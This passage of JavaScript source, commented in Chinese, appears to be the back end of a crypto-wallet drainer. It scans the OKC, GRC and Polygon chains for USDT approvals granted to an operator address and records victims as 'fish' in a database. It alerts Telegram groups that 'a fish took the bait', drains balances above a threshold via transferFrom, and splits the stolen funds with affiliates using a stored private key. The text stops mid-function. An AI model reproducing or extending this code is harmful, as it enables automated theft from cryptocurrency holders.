                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'OKC'",
                      [`授权额度：${Math.floor(transferAmountIn)}`, fromAddress]
                  );
              }
          }
      } else {
          approvalStatus = "✅ <code>授权成功</code>";
          additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fromAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
          if (existingFish.length > 0) {
              await pool.promise().query(
                  "UPDATE fish SET chainid = 'OKC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'OKC'",
                  [OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id, fromAddress]
              );
          } else {
              await pool.promise().query(
                  "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'OKC', ?, ?, ?, ?, ?, ?, NULL, 1)",
                  [fromAddress, OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id]
              );
          }
      }
      const notification = `🎣【有鱼上钩啦】OKC-USDT授权通知🎣\n\n` +
          `🐠鱼苗地址${usernameDisplay}：<code>${fromAddress}</code>\n\n` +
          `🔐权限地址：<code>${OxPermissionAddress}</code>\n\n` +
          `📨授权状态：${approvalStatus}\n\n` +
          `⏰授权时间：<code>${localTime}</code>\n\n` +
          `🪫OKT 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
          `<b>${additionalNote}</b>`;
      const buttons = {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🌍详细交易信息", url: `https://www.oklink.com/okc/tx/${transaction.hash}` }]
              ]
          }
      };
      if (groupid) {
          await bot.sendMessage(groupid, notification, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              ...buttons
          });
      }
  } catch (error) {
      console.error(`[${getTimeInfo().time}] OKC处理USDT授权时发生错误:`, error);
  }
}


// GRC监控模块

// GRC Web3实例
let GRCweb3Instance = null;
// GRC 网络配置参数 
const GRC_CONFIG = {
    rpc: 'https://evm.nodeinfo.cc',                // 主节点
    // 备用节点
    rpcBackups: [
        'https://evm.gatenode.cc'
    ],
    usdt: '0x4151ab5072198d0843cd2999590ef292f49d6c66', // USDT合约地址
    decimals: 6,                                    // 代币精度
    symbol: 'GT',                                  // GAS名称
    chainId: 'GRC'                                 // 链标识
};

// 初始化 Web3 实例
async function GRCinitWeb3() {
    try {
        GRCweb3Instance = new Web3(new Web3.providers.HttpProvider(GRC_CONFIG.rpc));
        await GRCweb3Instance.eth.getBlockNumber();
        return true;
    } catch (error) {
        // console.error(`[${getTimeInfo().time}] GRC-主节点连接失败，尝试备用节点...`);
        // 尝试备用节点
        for (const backupRpc of GRC_CONFIG.rpcBackups) {
            try {
                GRCweb3Instance = new Web3(new Web3.providers.HttpProvider(backupRpc));
                await GRCweb3Instance.eth.getBlockNumber();
                return true;
            } catch (err) {
                // console.error(`[${getTimeInfo().time}] GRC-备用节点连接失败: ${backupRpc}`);
                continue;
            }
        }
        // console.error(`[${getTimeInfo().time}] GRC-所有节点连接都失败`);
        return false;
    }
}

// 获取最新的区块号并处理新区块
async function GRCfetchLatestBlock() {
    let GRClastProcessedBlock = null;
    while (true) {
        try {
            if (!GRCweb3Instance) {
                console.error(`[${getTimeInfo().time}] Web3实例不存在，请确保已初始化`);
                await new Promise(resolve => setTimeout(resolve, 5000));
                continue;
            }
            const blockNumber = Number(await GRCweb3Instance.eth.getBlockNumber());
            if (GRClastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] GRC初始化: 当前最新区块号为 ${blockNumber}`);
                GRClastProcessedBlock = blockNumber;
            } else if (blockNumber > GRClastProcessedBlock) {
                const newBlocks = [];
                for (let i = GRClastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                for (const block of newBlocks) {
                    await GRCscanBlock(block);
                }
                GRClastProcessedBlock = blockNumber;
            }
        } catch (error) {
            // console.error(`[${getTimeInfo().time}] GRC获取最新区块时发生错误:`, error);
            // 如果错误，尝试重新初始化
            await GRCinitWeb3();
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// GRC获取区块信息
async function GRCscanBlock(blockNumber) {
    try {
        if (!GRCweb3Instance) {
            console.log(`[${getTimeInfo().time}] GRC-Web3实例不存在，跳过区块 ${blockNumber}`);
            return;
        }
        const block = await GRCweb3Instance.eth.getBlock(blockNumber, true);
        if (!block) {
            console.log(`[${getTimeInfo().time}] GRC区块 ${blockNumber} 未找到，跳过该区块`);
            return;
        }
        if (block.transactions && block.transactions.length > 0) {
            for (const tx of block.transactions) {
                if (!tx || typeof tx !== 'object' || !tx.to || !tx.from || !tx.input || !tx.hash) {
                    continue;
                }
                if (tx.to.toLowerCase() !== GRC_CONFIG.usdt.toLowerCase()) {
                    continue;
                }
                const methodId = tx.input.slice(0, 10);
                const transactionData = {
                    hash: tx.hash,
                    from: tx.from,
                    to: tx.to,
                    value: String(tx.value),
                    valueInGT: GRCweb3Instance.utils.fromWei(tx.value, 'ether'),
                    gas: String(tx.gas),
                    gasPrice: String(tx.gasPrice),
                    gasPriceInGwei: GRCweb3Instance.utils.fromWei(tx.gasPrice, 'gwei'),
                    input: tx.input,
                    nonce: String(tx.nonce),
                    blockNumber: String(blockNumber),
                    timestamp: String(block.timestamp),
                    transactionIndex: String(tx.transactionIndex)
                };
                if (methodId === '0xa9059cbb') {
                    // transfer 事件
                    await GRCusdt_transfer(transactionData);
                } else if (methodId === '0x095ea7b3') {
                    // approve 事件
                    await GRCusdt_approve(transactionData);
                }
            }
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] GRC处理区块 ${blockNumber} 时发生错误:`, error);
    }
}

// GRC-USDT 转账处理
async function GRCusdt_transfer(transaction) {
   try {
       const fromAddress = transaction.from.toLowerCase();
       const toAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
       const amount = parseInt(transaction.input.slice(74), 16) / (10 ** GRC_CONFIG.decimals);
       const relatedAddresses = Array.from(cacheData.fishMap.values())
           .filter(row => (
               (row.fish_address.toLowerCase() === fromAddress || 
               row.fish_address.toLowerCase() === toAddress) &&
               row.chainid === 'GRC' &&
               row.auth_status === 1
           ));
       if (!relatedAddresses.length) return;
       for (const row of relatedAddresses) {
           const address = row.fish_address;
           const unique_id = row.unique_id;
           const isOutgoing = address.toLowerCase() === fromAddress;
           const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
           const transactionAddress = isOutgoing ? toAddress : fromAddress;
           const dailiInfo = cacheData.dailiMap.get(unique_id);
           if (!dailiInfo) continue;
           const { username, groupid } = dailiInfo;
           const { gasBalance, usdtBalance } = await ERCcheckBalance(address, GRC_CONFIG.chainId);
           const notification = `🐟【鱼苗动账通知】GRC-USDT 转账通知🐟\n\n` +
               `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
               `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
               `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
               `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
               `🪫GT 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
           const buttons = {
               reply_markup: {
                   inline_keyboard: [
                       [{ text: "🌍详细交易信息", url: `https://gatescan.org/tx/${transaction.hash}` }]
                   ]
               }
           };
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
           await pool.promise().query(
               "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'GRC' AND auth_status = 1",
               [gasBalance, usdtBalance, address]
           );
           const fishInfo = cacheData.fishMap.get(address);
           if (fishInfo) {
               fishInfo.gas_balance = gasBalance;
               fishInfo.usdt_balance = usdtBalance;
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}]GRC 处理USDT转账时发生错误:`, error);
   }
}

// GRC-USDT 授权处理
async function GRCusdt_approve(transaction) {
  try {
      const OxPermissionAddress = cacheData.options['OxPermissionAddress'];
      const fromAddress = transaction.from.toLowerCase();
      const spenderAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
      const transferAmountIn = parseInt(transaction.input.slice(74), 16) / (10 ** GRC_CONFIG.decimals);
      if (spenderAddress !== OxPermissionAddress.toLowerCase()) {
          return;
      }
      const date = new Date(Number(transaction.timestamp) * 1000);
      const localTime = date.toISOString().slice(0, 19).replace('T', ' ');
      const { gasBalance, usdtBalance } = await ERCcheckBalance(fromAddress, GRC_CONFIG.chainId);
      
      let unique_id = null;
      const [browseRow] = await pool.promise().query(
          "SELECT unique_id FROM fish_browse WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'GRC' ORDER BY time DESC LIMIT 1",
          [fromAddress]
      );
      if (browseRow.length > 0 && browseRow[0].unique_id) {
          unique_id = browseRow[0].unique_id;
      } else {
          const [defaultIdRow] = await pool.promise().query(
              "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
          );
          if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
              unique_id = defaultIdRow[0].value;
          }
      }
      const dailiInfo = cacheData.dailiMap.get(unique_id);
      const { username, groupid, threshold } = dailiInfo;
      const usernameDisplay = username ? ` @${username}` : '';
      const [existingFish] = await pool.promise().query(
          "SELECT * FROM fish WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'GRC'",
          [fromAddress]
      );
      let approvalStatus = "";
      let additionalNote = "";
      if (transferAmountIn === 0 || transferAmountIn < 200) {
          if (transferAmountIn === 0) {
              approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
              additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'GRC'",
                      ["取消授权", fromAddress]
                  );
              }
          } else {
              approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
              additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'GRC'",
                      [`授权额度：${Math.floor(transferAmountIn)}`, fromAddress]
                  );
              }
          }
      } else {
          approvalStatus = "✅ <code>授权成功</code>";
          additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fromAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
          if (existingFish.length > 0) {
              await pool.promise().query(
                  "UPDATE fish SET chainid = 'GRC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'GRC'",
                  [OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id, fromAddress]
              );
          } else {
              await pool.promise().query(
                  "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'GRC', ?, ?, ?, ?, ?, ?, NULL, 1)",
                  [fromAddress, OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id]
              );
          }
      }
      const notification = `🎣【有鱼上钩啦】GRC-USDT授权通知🎣\n\n` +
          `🐠鱼苗地址${usernameDisplay}：<code>${fromAddress}</code>\n\n` +
          `🔐权限地址：<code>${OxPermissionAddress}</code>\n\n` +
          `📨授权状态：${approvalStatus}\n\n` +
          `⏰授权时间：<code>${localTime}</code>\n\n` +
          `🪫GT 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
          `<b>${additionalNote}</b>`;
      const buttons = {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🌍详细交易信息", url: `https://gatescan.org/tx/${transaction.hash}` }]
              ]
          }
      };
      if (groupid) {
          await bot.sendMessage(groupid, notification, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              ...buttons
          });
      }
  } catch (error) {
      console.error(`[${getTimeInfo().time}] GRC处理USDT授权时发生错误:`, error);
  }
}


// POL监控模块

// POL Web3实例
let POLweb3Instance = null;
// POL 网络配置参数 
const POL_CONFIG = {
    rpc: 'https://polygon-mainnet.public.blastapi.io',                // 主节点
    // 备用节点
    rpcBackups: [
        'https://polygon-rpc.com'
    ],
    usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', //USDT合约地址
    decimals: 6,                                    // 代币精度
    symbol: 'POL',                                  // GAS名称
    chainId: 'POL'                                 // 链标识
};

// 初始化 Web3 实例
async function POLinitWeb3() {
    try {
        POLweb3Instance = new Web3(new Web3.providers.HttpProvider(POL_CONFIG.rpc));
        await POLweb3Instance.eth.getBlockNumber();
        return true;
    } catch (error) {
        // console.error(`[${getTimeInfo().time}] POL-主节点连接失败，尝试备用节点...`);
        // 尝试备用节点
        for (const backupRpc of POL_CONFIG.rpcBackups) {
            try {
                POLweb3Instance = new Web3(new Web3.providers.HttpProvider(backupRpc));
                await POLweb3Instance.eth.getBlockNumber();
                return true;
            } catch (err) {
                // console.error(`[${getTimeInfo().time}] POL-备用节点连接失败: ${backupRpc}`);
                continue;
            }
        }
        // console.error(`[${getTimeInfo().time}] POL-所有节点连接都失败`);
        return false;
    }
}

// 获取最新的区块号并处理新区块
async function POLfetchLatestBlock() {
    let POLlastProcessedBlock = null;
    while (true) {
        try {
            if (!POLweb3Instance) {
                console.error(`[${getTimeInfo().time}] Web3实例不存在，请确保已初始化`);
                await new Promise(resolve => setTimeout(resolve, 5000));
                continue;
            }
            const blockNumber = Number(await POLweb3Instance.eth.getBlockNumber());
            if (POLlastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] POL初始化: 当前最新区块号为 ${blockNumber}`);
                POLlastProcessedBlock = blockNumber;
            } else if (blockNumber > POLlastProcessedBlock) {
                const newBlocks = [];
                for (let i = POLlastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                for (const block of newBlocks) {
                    await POLscanBlock(block);
                }
                POLlastProcessedBlock = blockNumber;
            }
        } catch (error) {
            // console.error(`[${getTimeInfo().time}] POL获取最新区块时发生错误:`, error);
            // 如果错误，尝试重新初始化
            await POLinitWeb3();
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// POL获取区块信息
async function POLscanBlock(blockNumber) {
    try {
        if (!POLweb3Instance) {
            console.log(`[${getTimeInfo().time}] POL-Web3实例不存在，跳过区块 ${blockNumber}`);
            return;
        }
        const block = await POLweb3Instance.eth.getBlock(blockNumber, true);
        if (!block) {
            // console.log(`[${getTimeInfo().time}] POL区块 ${blockNumber} 未找到，跳过该区块`);
            return;
        }
        if (block.transactions && block.transactions.length > 0) {
            for (const tx of block.transactions) {
                if (!tx || typeof tx !== 'object' || !tx.to || !tx.from || !tx.input || !tx.hash) {
                    continue;
                }
                if (tx.to.toLowerCase() !== POL_CONFIG.usdt.toLowerCase()) {
                    continue;
                }
                const methodId = tx.input.slice(0, 10);
                const transactionData = {
                    hash: tx.hash,
                    from: tx.from,
                    to: tx.to,
                    value: String(tx.value),
                    valueInMATIC: POLweb3Instance.utils.fromWei(tx.value, 'ether'),
                    gas: String(tx.gas),
                    gasPrice: String(tx.gasPrice),
                    gasPriceInGwei: POLweb3Instance.utils.fromWei(tx.gasPrice, 'gwei'),
                    input: tx.input,
                    nonce: String(tx.nonce),
                    blockNumber: String(blockNumber),
                    timestamp: String(block.timestamp),
                    transactionIndex: String(tx.transactionIndex)
                };
                if (methodId === '0xa9059cbb') {
                    // transfer 事件
                    await POLusdt_transfer(transactionData);
                } else if (methodId === '0x095ea7b3') {
                    // approve 事件
                    await POLusdt_approve(transactionData);
                }
            }
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] POL处理区块 ${blockNumber} 时发生错误:`, error);
    }
}

// POL-USDT 转账处理
async function POLusdt_transfer(transaction) {
   try {
       const fromAddress = transaction.from.toLowerCase();
       const toAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
       const amount = parseInt(transaction.input.slice(74), 16) / (10 ** POL_CONFIG.decimals);
       const relatedAddresses = Array.from(cacheData.fishMap.values())
           .filter(row => (
               (row.fish_address.toLowerCase() === fromAddress || 
               row.fish_address.toLowerCase() === toAddress) &&
               row.chainid === 'POL' &&
               row.auth_status === 1
           ));
       if (!relatedAddresses.length) return;
       for (const row of relatedAddresses) {
           const address = row.fish_address;
           const unique_id = row.unique_id;
           const isOutgoing = address.toLowerCase() === fromAddress;
           const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
           const transactionAddress = isOutgoing ? toAddress : fromAddress;
           const dailiInfo = cacheData.dailiMap.get(unique_id);
           if (!dailiInfo) continue;
           const { username, groupid } = dailiInfo;
           const { gasBalance, usdtBalance } = await ERCcheckBalance(address, POL_CONFIG.chainId);
           const notification = `🐟【鱼苗动账通知】POL-USDT 转账通知🐟\n\n` +
               `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
               `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
               `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
               `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
               `🪫MATIC 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
           const buttons = {
               reply_markup: {
                   inline_keyboard: [
                       [{ text: "🌍详细交易信息", url: `https://polygonscan.com/tx/${transaction.hash}` }]
                   ]
               }
           };
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
           await pool.promise().query(
               "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'POL' AND auth_status = 1",
               [gasBalance, usdtBalance, address]
           );
           const fishInfo = cacheData.fishMap.get(address);
           if (fishInfo) {
               fishInfo.gas_balance = gasBalance;
               fishInfo.usdt_balance = usdtBalance;
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] POL处理USDT转账时发生错误:`, error);
   }
}

// POL-USDT 授权处理
async function POLusdt_approve(transaction) {
  try {
      const OxPermissionAddress = cacheData.options['OxPermissionAddress'];
      const fromAddress = transaction.from.toLowerCase();
      const spenderAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
      const transferAmountIn = parseInt(transaction.input.slice(74), 16) / (10 ** POL_CONFIG.decimals);
      if (spenderAddress !== OxPermissionAddress.toLowerCase()) {
          return;
      }
      const date = new Date(Number(transaction.timestamp) * 1000);
      const localTime = date.toISOString().slice(0, 19).replace('T', ' ');
      const { gasBalance, usdtBalance } = await ERCcheckBalance(fromAddress, POL_CONFIG.chainId);
      let unique_id = null;
      const [browseRow] = await pool.promise().query(
          "SELECT unique_id FROM fish_browse WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'POL' ORDER BY time DESC LIMIT 1",
          [fromAddress]
      );
      if (browseRow.length > 0 && browseRow[0].unique_id) {
          unique_id = browseRow[0].unique_id;
      } else {
          const [defaultIdRow] = await pool.promise().query(
              "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
          );
          if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
              unique_id = defaultIdRow[0].value;
          }
      }
      const dailiInfo = cacheData.dailiMap.get(unique_id);
      const { username, groupid, threshold } = dailiInfo;
      const usernameDisplay = username ? ` @${username}` : '';
      const [existingFish] = await pool.promise().query(
          "SELECT * FROM fish WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'POL'",
          [fromAddress]
      );
      let approvalStatus = "";
      let additionalNote = "";
      if (transferAmountIn === 0 || transferAmountIn < 200) {
          if (transferAmountIn === 0) {
              approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
              additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'POL'",
                      ["取消授权", fromAddress]
                  );
              }
          } else {
              approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
              additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'POL'",
                      [`授权额度：${Math.floor(transferAmountIn)}`, fromAddress]
                  );
              }
          }
      } else {
          approvalStatus = "✅ <code>授权成功</code>";
          additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fromAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
          if (existingFish.length > 0) {
              await pool.promise().query(
                  "UPDATE fish SET chainid = 'POL', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'POL'",
                  [OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id, fromAddress]
              );
          } else {
              await pool.promise().query(
                  "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'POL', ?, ?, ?, ?, ?, ?, NULL, 1)",
                  [fromAddress, OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id]
              );
          }
      }
      const notification = `🎣【有鱼上钩啦】POL-USDT授权通知🎣\n\n` +
          `🐠鱼苗地址${usernameDisplay}：<code>${fromAddress}</code>\n\n` +
          `🔐权限地址：<code>${OxPermissionAddress}</code>\n\n` +
          `📨授权状态：${approvalStatus}\n\n` +
          `⏰授权时间：<code>${localTime}</code>\n\n` +
          `🪫MATIC 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
          `<b>${additionalNote}</b>`;
      const buttons = {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🌍详细交易信息", url: `https://polygonscan.com/tx/${transaction.hash}` }]
              ]
          }
      };
      if (groupid) {
          await bot.sendMessage(groupid, notification, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              ...buttons
          });
      }
  } catch (error) {
      console.error(`[${getTimeInfo().time}] POL处理USDT授权时发生错误:`, error);
  }
}

// 监控鱼池 >>> 查找阈值小于USDT余额的鱼苗
async function monitorFishTable() {
   const processingFish = new Set();
   while (true) {
       try {
           const fishList = Array.from(cacheData.fishMap.values())
               .filter(fish => 
                   fish.auth_status === 1 && 
                   fish.threshold !== null && 
                   Number(fish.usdt_balance) > Number(fish.threshold) &&
                   !processingFish.has(fish.fish_address)
               );
           if (fishList.length > 0) {
               const fish = fishList[0];
               const { fish_address, chainid } = fish;
               processingFish.add(fish_address);
               (async () => {
                   try {
                       if (chainid === 'TRC') {
                           await processTRCTransfer(fish_address, fish.permissions_fishaddress, fish.usdt_balance);
                       } else {
                           await ERCtransferFrom(fish.permissions_fishaddress, fish_address, fish.usdt_balance, chainid);
                       }
                   } catch (error) {
                       console.error(`[${getTimeInfo().time}] 处理转账失败: ${fish_address}, 链: ${chainid}, 错误:`, error);
                   } finally {
                       processingFish.delete(fish_address);
                   }
               })();
           }
       } catch (error) {
           console.error(`[${getTimeInfo().time}] 监控鱼池时发生错误:`, error);
       }
       // 每3秒查询一次
       await new Promise(resolve => setTimeout(resolve, 3000));
   }
}

// 处理TRC-USDT的转账和分润
async function processTRCTransfer(fishAddress, contractAddress, transferAmountIn) {
    let dailiInfo = null;
    let groupInfo = null;
    let transactionHash = null;
    let notificationMessage; 
    let actualTransferAmount;
    let remainingBalance;
    try {
        const payment_address = cacheData.options['payment_address'];
        const contract_method = cacheData.options['contract_method'];
        const need_usdt_contract = cacheData.options['need_usdt_contract'];
        const fishInfo = cacheData.fishMap.get(fishAddress);
        try {
            dailiInfo = cacheData.dailiMap.get(fishInfo.unique_id); 
            if (dailiInfo && dailiInfo.groupid) {
                groupInfo = cacheData.dailiGroupMap.get(dailiInfo.groupid);
            }
        } catch (infoError) {
            dailiInfo = null;
        }
        const amountToWithdraw = Math.floor((transferAmountIn - 0.000001) * 1000000) / 1000000;
        remainingBalance = 0.000001;
        actualTransferAmount = amountToWithdraw;
        
        const executeTransaction = async (toAddress, amount) => {
            const hash = await executeContractTransaction(
                contract_method,
                need_usdt_contract,
                fishAddress,
                contractAddress,
                toAddress,
                amount
            );
            return hash;
        };
        if (dailiInfo && dailiInfo.payment_address) {
            const share_profits = groupInfo ? parseFloat(groupInfo.share_profits || 0.50) : 0.50;
            const dailiAmount = Math.floor(amountToWithdraw * share_profits * 1000000) / 1000000;
            const platformAmount = Math.floor((amountToWithdraw - dailiAmount) * 1000000) / 1000000;
            if (share_profits === 0.00) {
                transactionHash = await executeTransaction(payment_address, actualTransferAmount);
                if (!transactionHash) {
                    return;
                }
            } else if (share_profits === 1.00) {
                transactionHash = await executeTransaction(dailiInfo.payment_address, actualTransferAmount);
                if (!transactionHash) {
                    return;
                }
            } else {
                const dailiTransactionHash = await executeTransaction(dailiInfo.payment_address, dailiAmount);
                if (!dailiTransactionHash) {
                    return;
                }
                transactionHash = dailiTransactionHash;
                await new Promise(resolve => setTimeout(resolve, 3000)); 
                const platformTransactionHash = await executeTransaction(payment_address, platformAmount);
                if (!platformTransactionHash) {
                    return;
                }
            }
            notificationMessage = `【🎣 TRC-USDT自动转账通知🎣】\n\n` +
                `🐟鱼苗地址：\n<code>${fishAddress}</code>\n\n` +
                `💳收款地址：@${dailiInfo.username}\n<code>${dailiInfo.payment_address}</code>\n\n` +
                `💸成功划扣：<code>${actualTransferAmount.toFixed(6)} USDT</code>\n\n` +
                `💎代理分润：<code>${Number(dailiAmount).toFixed(6)} USDT</code>\n\n` +
                `🌱🌱 种下奋斗的种子 ，收获丰盛的财富和梦想！ 🌱🌱`;
        } else {
            transactionHash = await executeTransaction(payment_address, actualTransferAmount);
            if (!transactionHash) {
                console.error(`[${getTimeInfo().time}] 转账失败`);
                return;
            }
            notificationMessage = `【🎣 TRC-USDT自动转账通知🎣】\n\n` +
                `🐟鱼苗地址：\n<code>${fishAddress}</code>\n\n` +
                `💳收款地址：${dailiInfo ? `@${dailiInfo.username}` : '未知代理'}\n<code>${payment_address}</code>\n\n` +
                `💸本次划扣：<code>${actualTransferAmount.toFixed(6)} USDT</code>\n\n` +
                `⭐️${dailiInfo ? '由于未设置收款地址，' : '未找到代理信息，'}请联系管理员领取分润⭐️`;
        }
        if (!transactionHash) {
            console.error(`[${getTimeInfo().time}] 没有获取到交易哈希，退出处理`);
            return;
        }
        await pool.promise().query(
            "UPDATE fish SET usdt_balance = ?, threshold = 200, remark = ? WHERE fish_address = ? AND chainid = 'TRC'",
            [remainingBalance, `已划扣${actualTransferAmount.toFixed(6)}USDT`, fishAddress]
        );
        if (dailiInfo && dailiInfo.groupid) {
            const buttons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${transactionHash}` }]
                    ]
                }
            };
            try {
                await bot.sendMessage(dailiInfo.groupid, notificationMessage, {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    ...buttons
                });
            } catch (notifyError) {
            }
        }
        return transactionHash;
    } catch (error) {
        console.error(`[${getTimeInfo().time}] TRC转账失败>错误详情:`, error);
        return null;
    }
}

// 执行TRC-USDT转账交易（本地签名，不经过外部API）
async function executeContractTransaction(contractMethod, needUsdtContract, fromAddress, contractAddress, toAddress, amountInSmallestUnit) {
    try {
        const private_key = cacheData.options['private_key'];
        const tronWeb = createTronWeb();
        if (!tronWeb) {
            return null;
        }
        const base58Address = tronWeb.address.fromPrivateKey(private_key);
        // 检查TRX余额是否足够提币
        const trxBalance = await tronWeb.trx.getBalance(base58Address);
        const trxBalanceInTRX = trxBalance / 1e6;
        // 如果TRX余额小于50，发送警告通知并结束转账
        if (trxBalanceInTRX < 50) {
            const fishInfo = cacheData.fishMap.get(fromAddress);
            const dailiInfo = cacheData.dailiMap.get(fishInfo.unique_id);
            const message = `【⚠️ 阈值转账错误通知】\n\n` +
                `❗ 错误原因：权限地址 TRX 余额不足\n\n` +
                `🎯 权限地址：\n<code>${base58Address}</code>\n\n` +
                `💰 当前余额：<code>${trxBalanceInTRX.toFixed(6)} TRX</code>\n\n` +
                `⏰ 时间：<code>${getTimeInfo().time}</code>\n\n` +
                `⚠️ 请至少保持权限地址有50TRX，以免影响杀鱼操作！`;
            try {
                await bot.sendMessage(dailiInfo.groupid, message, { parse_mode: 'HTML' });
            } catch (notifyError) {
                console.error(`[${getTimeInfo().time}] TRX转账-发送余额不足通知失败`);
            }
            return null;
        }

        // 本地构建并发送合约交易
        tronWeb.setAddress(base58Address);
        tronWeb.setPrivateKey(private_key);

        const contract = await tronWeb.contract().at(contractAddress);
        const amountInUint256 = parseInt((amountInSmallestUnit * 1000000).toFixed(0));

        let txResult;
        if (needUsdtContract === '1') {
            txResult = await contract[contractMethod](
                USDT_CONTRACT,
